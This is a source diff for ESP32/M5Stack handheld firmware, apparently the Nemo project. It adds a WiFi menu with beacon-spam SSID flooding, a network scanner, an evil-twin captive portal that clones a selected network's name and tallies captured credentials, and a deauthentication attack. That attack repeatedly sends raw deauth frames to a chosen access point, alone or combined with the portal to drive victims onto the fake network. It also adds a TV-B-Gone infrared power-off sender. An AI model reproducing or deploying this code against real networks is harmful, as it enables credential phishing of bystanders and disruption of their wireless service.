@@ -247,12 +247,35 @@ bool isSwitching = true;
 #else
   int current_proc = 1; // Start in Main Menu mode if no RTC
 #endif
+// DEAUTH vars
+uint8_t channel;
+String apMac = String("");
+bool target_deauth_flg = false;
+bool target_deauth = false;
+int deauth_tick = 0;        // used to delay the deauth packets when combined to Nemo Portal
+bool clone_flg = false;
+// DEAUTH end
 
+#include <IRremoteESP8266.h>
+#include <IRsend.h>
+#include <DNSServer.h>
+#include <WebServer.h>
+#include <BLEUtils.h>
+#include <BLEServer.h>
 // Import Languages
 #include "src/languages/language.h"
 // Import Tools
 #include "src/tools/bluetooth/applejuice.h"
 #include "src/tools/bluetooth/wifispam.h"
+#include "src/tools/bluetooth/portal.h"
+#include "src/tools/tvbg/codes.h"
+
+#if defined(DEAUTHER)
+  #include "src/tools/bluetooth/deauth.h"                                           //DEAUTH
+  #include "esp_wifi.h"                                                             //DEAUTH
+#endif
+  wifi_ap_record_t ap_record;                                                       //DEAUTH
+
 
 struct MENU {
   char name[19];
@@ -542,6 +565,10 @@ void setup() {
   pAdvertising = pServer->getAdvertising();
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
+  // Nemo Portal Init
+  //setupSdCard();
+  bootTime = lastActivity = millis();
+
   screenBrightness(brightness);
   dimtimer();
   DISP.setRotation(1);
@@ -785,8 +812,7 @@ int rotation = 1;
     old_battery = battery;
   }
 
-  int get_battery(int timer)
-	{
+  int get_battery(int timer) {
     float c = M5.Axp.GetVapsData() * 1.4 / 1000;
     float b = M5.Axp.GetVbatData() * 1.1 / 1000;
     int battery = ((b - 3.0) / 1.2) * 100;
@@ -978,6 +1004,8 @@ void utmenu_loop() {
 MENU emenu[] = {
   { TXT_BACK, 1},
   { "Bluetooth", 10},
+  { "Wifi", 15},
+  { "IR", 21},
   
 };
 int emenu_size = sizeof(emenu) / sizeof (MENU);
@@ -1476,6 +1504,613 @@ void btmaelstrom_loop(){
   }
 }
 
+/// WiFiSPAM ///
+void wifispam_setup() {
+  // create empty SSID
+  for (int i = 0; i < 32; i++)
+    emptySSID[i] = ' ';
+  // for random generator
+  randomSeed(1);
+
+  // set packetSize
+  packetSize = sizeof(beaconPacket);
+  if (wpa2) {
+    beaconPacket[34] = 0x31;
+  } else {
+    beaconPacket[34] = 0x21;
+    packetSize -= 26;
+  }
+
+  //change WiFi mode
+  WiFi.mode(WIFI_MODE_STA);
+
+  // set channel
+  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
+
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(BIG_TEXT);
+  DISP.setCursor(0, 0);
+  DISP.println(TXT_WF_SP);
+  delay(1000);
+  DISP.setTextSize(TINY_TEXT);
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.print(TXT_WF_SP);
+    int ct = 0;
+    const char *str;
+    switch(spamtype) {
+    case 1:
+      for(str = funnyssids; *str; ++str) ct += *str == '\n';
+      DISP.printf(" - %d SSIDs:\n", ct);
+      DISP.print(funnyssids);
+      break;
+    case 2:
+      for(str = rickrollssids; *str; ++str) ct += *str == '\n';
+      DISP.printf(" - %d SSIDs:\n", ct);
+      DISP.print(rickrollssids);
+      break;
+    case 3:
+      DISP.printf(TXT_RND_SSID, ct);
+      break;
+  }
+  DISP.setTextSize(SMALL_TEXT);
+  current_proc = 14;
+}
+
+void wifispam_loop() {
+  int i = 0;
+  int len = 0;
+#if defined(M5LED)
+  digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
+  delay(1);
+  digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
+#endif
+  switch(spamtype) {
+    case 1:
+      len = sizeof(funnyssids);
+      while(i < len){
+        i++;
+      }
+      beaconSpamList(funnyssids);
+      break;
+    case 2:
+      len = sizeof(rickrollssids);
+      while(i < len){
+        i++;
+      }
+      beaconSpamList(rickrollssids);
+      break;
+    case 3:
+      char* randoms = randomSSID();
+      len = sizeof(randoms);
+      while(i < len){
+        i++;
+      }
+      beaconSpamList(randoms);
+      break;
+  }
+}
+
+/// WIFI MENU ///
+MENU wsmenu[] = {
+  { TXT_BACK, 5},
+  { TXT_WF_SCAN, 0},
+  { TXT_WF_SPAM_FUN, 1},
+  { TXT_WF_SPAM_RR, 2},
+  { TXT_WF_SPAM_RND, 3},
+  { "NEMO Portal", 4},
+};
+int wsmenu_size = sizeof(wsmenu) / sizeof (MENU);
+
+void wsmenu_setup() {
+  cursor = 0;
+  rstOverride = true;
+  drawmenu(wsmenu, wsmenu_size);
+  delay(500); // Prevent switching after menu loads up
+}
+
+void wsmenu_loop() {
+  battery_show(false, 5000);
+  clock_show();
+  if (check_next_press()) {
+    cursor++;
+    cursor = cursor % wsmenu_size;
+    drawmenu(wsmenu, wsmenu_size);
+    delay(250);
+  }
+  if (check_select_press()) {
+    int option = wsmenu[cursor].command;
+    rstOverride = false;
+    current_proc = 14;
+    isSwitching = true;
+    switch(option) {
+      case 0:
+        rstOverride = false;
+        isSwitching = true;
+        current_proc = 16;
+        break;
+      case 1:
+        spamtype = 1;
+        break;
+      case 2:
+        spamtype = 2;
+        break;
+      case 3:
+        spamtype = 3;
+        break;
+      case 4:
+        current_proc = 17;
+        break;
+      case 5:
+        current_proc = 9;
+        break;
+    }
+  }
+}
+
+void wscan_drawmenu() {
+  char ssid[19];
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  // scrolling menu
+  if (cursor > 4) {
+    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
+      if(cursor == i){
+        DISP.setTextColor(BGCOLOR, FGCOLOR);
+      }
+      DISP.print(" ");
+      DISP.println(WiFi.SSID(i).substring(0,19));
+      DISP.setTextColor(FGCOLOR, BGCOLOR);
+    }
+  } else {
+    for ( int i = 0 ; i < wifict ; i++ ) {
+      if(cursor == i){
+        DISP.setTextColor(BGCOLOR, FGCOLOR);
+      }
+      DISP.print(" ");
+      DISP.println(WiFi.SSID(i).substring(0,19));
+      DISP.setTextColor(FGCOLOR, BGCOLOR);
+    }
+  }
+  if(cursor == wifict){
+    DISP.setTextColor(BGCOLOR, FGCOLOR);
+  }
+  DISP.println(TXT_WF_RESCAN);
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  if(cursor == wifict + 1){
+    DISP.setTextColor(BGCOLOR, FGCOLOR);
+  }
+  DISP.println(String(TXT_BACK));
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+}
+
+void wscan_result_setup() {
+  cursor = 0;
+  rstOverride = true;
+  wscan_drawmenu();
+  delay(500); // Prevent switching after menu loads up
+}
+
+void wscan_result_loop(){
+  if (check_next_press()) {
+    cursor++;
+    cursor = cursor % ( wifict + 2);
+    wscan_drawmenu();
+    delay(250);
+  }
+  if (check_select_press()) {
+    delay(250);
+    if(cursor == wifict){
+      rstOverride = false;
+      current_proc = 16;
+    }
+    if(cursor == wifict + 1){
+      rstOverride = false;
+      isSwitching = true;
+      current_proc = 15;
+    }
+    String encryptType = "";
+    switch (WiFi.encryptionType(cursor)) {
+    case 1:
+      encryptType = "WEP";
+      break;
+    case 2:
+      encryptType = "WPA/PSK/TKIP";
+      break;
+    case 3:
+      encryptType = "WPA/PSK/CCMP";
+      break;
+    case 4:
+      encryptType = "WPA2/PSK/Mixed/CCMP";
+      break;
+    case 8:
+      encryptType = "WPA/WPA2/PSK";
+      break ;
+    case 0:
+      encryptType = TXT_WF_OPEN;
+      break ;
+    }
+    DISP.fillScreen(BGCOLOR);
+    DISP.setCursor(0, 0);
+    DISP.setTextColor(BGCOLOR, FGCOLOR);
+    if(WiFi.SSID(cursor).length() > 12){
+      DISP.setTextSize(SMALL_TEXT);
+    }else if(WiFi.SSID(cursor).length() > 20){
+      DISP.setTextSize(TINY_TEXT);
+    }else{
+      DISP.setTextSize(MEDIUM_TEXT);
+    }
+    DISP.println(WiFi.SSID(cursor));
+    DISP.setTextColor(FGCOLOR, BGCOLOR);
+    DISP.setTextSize(SMALL_TEXT);
+    DISP.printf(TXT_WF_CHANN, WiFi.channel(cursor));
+    DISP.printf(TXT_WF_CRYPT, encryptType);
+    // DISP.print("BSSID:\n" + WiFi.BSSIDstr(i));
+    DISP.printf(TXT_SEL_BACK);
+    DISP.setTextColor(BGCOLOR, FGCOLOR);
+    DISP.printf(" %-19s\n", TXT_HOLD_ATTACK);
+    DISP.setTextColor(FGCOLOR, BGCOLOR);
+   if(check_select_press()){
+      apMac=WiFi.BSSIDstr(cursor);
+      apSsidName=WiFi.SSID(cursor);
+      channel = static_cast<uint8_t>(WiFi.channel(cursor));                            // DEAUTH - save channel
+      uint8_t* bssid = WiFi.BSSID(cursor);                                             // DEAUTH - save BSSID (AP MAC)
+      memcpy(ap_record.bssid, bssid, 6);                                               // DEAUTH - cpy bssid to memory
+      rstOverride = false;
+      current_proc = 18;
+      isSwitching = true;
+      delay(100);
+    }
+  }
+}
+
+void wscan_setup(){
+  rstOverride = false;  
+  cursor = 0;
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(BIG_TEXT);
+  DISP.setCursor(0, 0);
+  DISP.println(TXT_WF_SCN);
+  delay(2000);
+}
+
+void wscan_loop(){
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.setCursor(0, 0);
+  DISP.println(TXT_WF_SCNING);
+  wifict = WiFi.scanNetworks();
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.setCursor(0, 0);
+  if(wifict > 0){
+    isSwitching = true;
+    current_proc = 19;
+  }
+}
+/// WIFI-Attack MENU and functions START///
+MENU wsAmenu[] = {
+  { TXT_BACK, 5},
+  { TXT_WFA_PORTAL, 0},
+  #if defined(DEAUTHER)
+    { TXT_WFA_DEAUTH, 1},
+    { TXT_WFA_COMBINED, 2},
+  #endif
+};
+int wsAmenu_size = sizeof(wsAmenu) / sizeof (MENU);
+
+void wsAmenu_setup() {
+  rstOverride = true;
+  drawmenu(wsAmenu, wsAmenu_size);
+  delay(500); // Prevent switching after menu loads up
+}
+
+void wsAmenu_loop() {
+  battery_show(false, 5000);
+  clock_show();
+  if (check_next_press()) {
+    cursor++;
+    cursor = cursor % wsAmenu_size;
+    drawmenu(wsAmenu, wsAmenu_size);
+    delay(250);
+  }
+  if (check_select_press()) {
+    int option = wsAmenu[cursor].command;
+    rstOverride = false;
+    current_proc = 18;
+    isSwitching = true;
+    switch(option) {
+      case 0:                     //Go to Clone Nemo Portal
+        rstOverride = false;
+        isSwitching = true;
+        clone_flg=true;
+        target_deauth_flg=false;
+        current_proc = 17;
+        break;
+      #if defined (DEAUTHER)
+        case 1:                     //Go to Deauth
+          rstOverride = false;
+          isSwitching = true;
+          target_deauth_flg=false;
+          target_deauth=true;
+          current_proc = 20;                                                                 // iserir codigo do deauth aqui
+          break;
+        case 2:                     //Go to Nemo with Deauth
+          rstOverride = false;
+          isSwitching = true;
+          clone_flg=true;
+          target_deauth_flg=true;
+          target_deauth=true;
+          current_proc = 17;
+          break;
+      #endif
+      case 5:                     //Exit
+        current_proc = 16;
+        break;
+    }
+  }
+}
+
+// NEMO PORTAL
+
+void portal_setup(){
+  setupWiFi();
+  setupWebServer();
+  portal_active = true;
+  cursor = 0;
+  rstOverride = true;
+  printHomeToScreen();
+  #if defined(DEAUTHER)                                                                      // DEAUTH
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));                  // DEAUTH
+  wsl_bypasser_send_deauth_frame(&ap_record, channel);                                       // DEAUTH  CREATE FRAME
+  #endif                                                                                     // DEAUTH
+  delay(500); // Prevent switching after menu loads up
+}
+
+void portal_loop(){
+  if ((millis() - lastTick) > PortalTickTimer) {
+    lastTick = millis();
+    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
+      previousTotalCapturedCredentials = totalCapturedCredentials;
+      printHomeToScreen();
+    }
+  }
+  if (clone_flg==true) {
+    #if defined(DEAUTHER)
+      if (target_deauth_flg) {
+        if (target_deauth == true) {                                                                 // DEAUTH
+          if (deauth_tick==35) {                                                                     // 35 is +-100ms   (Add delay to attack, without reflection on portal)
+            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));                 // DEAUTH   SEND FRAME
+            deauth_tick=0;
+          } else { 
+            deauth_tick=deauth_tick+1; 
+          }
+          DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
+          DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
+          DISP.setCursor(1, 115);                                                                    // DEAUTH
+          DISP.println(TXT_DEAUTH_STOP);                                                             // DEAUTH
+          DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
+        } else{                                                                                      // DEAUTH
+          DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
+          DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
+          DISP.setCursor(1, 115);                                                                    // DEAUTH
+          DISP.println(TXT_DEAUTH_START);                                                            // DEAUTH
+          DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
+        }                                                                                            // DEAUTH
+        if (check_select_press()){                                                                    // DEAUTH
+          target_deauth = !target_deauth;                                                             // DEAUTH
+          delay(500);                                                                                 // DEAUTH
+        }
+      }
+    #endif
+  }
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+  
+  if (check_next_press()){
+    shutdownWebServer();
+    portal_active = false;
+    target_deauth_flg = false;                                                                     // DEAUTH
+    target_deauth = false;                                                                         // DEAUTH
+    clone_flg = false;                                                                             // DEAUTH
+    current_proc = 15;
+    delay(500);
+  }
+  check_select_press();
+}
+
+/// TV-B-GONE ///
+void tvbgone_setup() {
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(BIG_TEXT);
+  DISP.setCursor(0, 0);
+  DISP.println("TV-B-Gone");
+  DISP.setTextSize(SMALL_TEXT);
+  irsend.begin();
+  // Hack: Set IRLED high to turn it off after setup. Otherwise it stays on (active low)
+  digitalWrite(IRLED, M5LED_OFF);
+
+  delay_ten_us(5000);
+  if(region == NA) {
+    DISP.print(TXT_RG_AMERICAS);
+  }
+  else {
+    DISP.println(TXT_RG_EMEA);
+  }
+  DISP.println(TXT_SEL_GO_PAUSE);
+  DISP.println(TXT_SEL_EXIT);
+  delay(1000);
+}
+
+void tvbgone_loop()
+{
+  if (check_select_press()) {
+    delay(250);
+    Serial.println(TXT_TRIG_TV);
+    sendAllCodes();
+  }
+}
+
+/// IR MENU ///
+MENU irmenu[] = {
+  { TXT_BACK, 1},
+  { "TV-B-Gone", 21},
+  
+};
+int irmenu_size = sizeof(irmenu) / sizeof (MENU);
+
+void irmenu_setup() {
+  cursor = 0;
+  rstOverride = true;
+  drawmenu(irmenu, irmenu_size);
+  delay(500); // Prevent switching after menu loads up
+}
+
+void irmenu_loop() {
+  battery_show(false, 5000);
+  clock_show();
+  if (check_next_press()) {
+    cursor++;
+    cursor = cursor % irmenu_size;
+    drawmenu(irmenu, irmenu_size);
+    delay(250);
+  }
+  if (check_select_press()) {
+    rstOverride = false;
+    isSwitching = true;
+    current_proc = irmenu[cursor].command;
+  }
+}
+
+/// TVBG-Region MENU ///
+MENU tvbgmenu[] = {
+  { TXT_BACK, 3},
+  { TXT_MN_AMERICA, 0},
+  { TXT_MN_EMEA, 1},
+};
+int tvbgmenu_size = sizeof(tvbgmenu) / sizeof (MENU);
+
+void tvbgmenu_setup() {  
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(BIG_TEXT);
+  DISP.setCursor(0, 0);
+  DISP.println("TV-B-Gone");
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.println(TXT_REGION);
+  cursor = region % 2;
+  rstOverride = true;
+  delay(1000); 
+  drawmenu(tvbgmenu, tvbgmenu_size);
+}
+
+void tvbgmenu_loop() {
+  battery_show(false, 5000);
+  clock_show();
+  if (check_next_press()) {
+    cursor++;
+    cursor = cursor % tvbgmenu_size;
+    drawmenu(tvbgmenu, tvbgmenu_size);
+    delay(250);
+  }
+  if (check_select_press()) {
+    region = tvbgmenu[cursor].command;
+
+    if (region == 3) {
+      current_proc = 22;
+      isSwitching = true;
+      rstOverride = false; 
+      return;
+    }
+
+    // #if defined(USE_EEPROM)
+    //   EEPROM.write(3, region);
+    //   EEPROM.commit();
+    // #endif
+    rstOverride = false;
+    isSwitching = true;
+    current_proc = 23;
+  }
+}
+
+void sendAllCodes() {
+  bool endingEarly = false; //will be set to true if the user presses the button during code-sending
+  if (region == NA) {
+    num_codes = num_NAcodes;
+  } else {
+    num_codes = num_EUcodes;
+  }
+  for (i = 0 ; i < num_codes; i++)
+  {
+    if (region == NA) {
+      powerCode = NApowerCodes[i];
+    }
+    else {
+      powerCode = EUpowerCodes[i];
+    }
+    const uint8_t freq = powerCode->timer_val;
+    const uint8_t numpairs = powerCode->numpairs;
+    DISP.fillScreen(BGCOLOR);
+    DISP.setTextSize(BIG_TEXT);
+    DISP.setCursor(0, 0);
+    DISP.println("TV-B-Gone");
+    DISP.setTextSize(SMALL_TEXT);
+    DISP.println(TXT_FK_GP);
+    const uint8_t bitcompression = powerCode->bitcompression;
+    code_ptr = 0;
+    for (uint8_t k = 0; k < numpairs; k++) {
+      uint16_t ti;
+      ti = (read_bits(bitcompression)) * 2;
+      #if defined(ACTIVE_LOW_IR)
+        offtime = powerCode->times[ti];  // read word 1 - ontime
+        ontime = powerCode->times[ti + 1]; // read word 2 - offtime
+      #else
+        ontime = powerCode->times[ti];  // read word 1 - ontime
+        offtime = powerCode->times[ti + 1]; // read word 2 - offtime      
+      #endif
+      DISP.setTextSize(TINY_TEXT);
+      DISP.printf("rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
+      Serial.printf("TVBG: rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
+      rawData[k * 2] = offtime * 10;
+      rawData[(k * 2) + 1] = ontime * 10;
+    }
+    irsend.sendRaw(rawData, (numpairs * 2) , freq);
+    digitalWrite(IRLED, M5LED_OFF);
+    bitsleft_r = 0;
+    delay_ten_us(20500);
+    #if defined(AXP)
+    if (M5.Axp.GetBtnPress()) {
+      endingEarly = true;
+      current_proc = 9;
+      isSwitching = true;
+      rstOverride = false; 
+      break;     
+    }
+    #endif
+#if defined(KB)
+#endif
+    if (check_select_press()){
+      Serial.println("endingearly");
+      endingEarly = true;
+      delay(250);
+      break; 
+    }
+  } 
+  if (endingEarly == false)
+  {
+    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
+    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
+    quickflashLEDx(8);
+  }
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(BIG_TEXT);
+  DISP.setCursor(0, 0);
+  DISP.println("TV-B-Gone");
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.println(TXT_SEL_GO_PAUSE);
+  DISP.println(TXT_SEL_EXIT);
+}
+
 void bootScreen(){
   // Boot Screen
   #ifdef SONG
@@ -1574,6 +2209,38 @@ void loop() {
       case 13:
         btmaelstrom_setup();
         break;
+      case 14:
+        wifispam_setup();
+        break;
+      case 15:
+        wsmenu_setup();
+        break;
+      case 16:
+        wscan_setup();
+        break;
+      case 17:
+        portal_setup();
+        break;
+      case 18:
+        wsAmenu_setup();
+        break;
+      case 19:
+        wscan_result_setup();
+        break;
+      #if defined(DEAUTHER)
+        case 20:
+          deauth_setup();
+          break;
+      #endif
+      case 21:
+          irmenu_setup();
+          break;
+      case 22:
+          tvbgmenu_setup();
+          break;
+      case 23:
+          tvbgone_setup();
+          break;
     }
   }
 
@@ -1627,6 +2294,38 @@ void loop() {
       break;
     case 13:
       btmaelstrom_loop();
+      break;
+    case 14:
+      wifispam_loop();
+      break;
+    case 15:
+      wsmenu_loop();
+      break;
+    case 16:
+      wscan_loop();
+      break;
+    case 17:
+      portal_loop();
+      break;
+    case 18:
+      wsAmenu_loop();
+      break;
+    case 19:
+      wscan_result_loop();
+      break;
+    #if defined(DEAUTHER)                                             // DEAUTH
+      case 20:
+        deauth_loop();                                                // DEAUTH
+        break;                                                        // DEAUTH
+    #endif                                                            // DEAUTH
+    case 21:
+      irmenu_loop();
+      break;
+    case 22:
+      tvbgmenu_loop();
+      break;
+    case 23:
+      tvbgone_loop();
       break;
   }
 }
